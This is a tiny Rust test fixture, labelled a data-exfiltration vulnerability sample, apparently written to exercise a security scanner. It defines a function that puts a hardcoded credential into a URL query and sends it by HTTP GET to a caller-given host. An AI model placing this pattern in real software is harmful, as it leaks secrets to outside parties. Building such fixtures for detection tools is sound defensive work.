// Phase 11 (Track J.9) — Rust DATA_EXFIL vuln fixture.
pub fn run(host: &str) {
    let secret = "alice-creds";
    let url = format!("http://{host}/exfil?token={secret}");
    let _ = reqwest::blocking::get(&url);
}
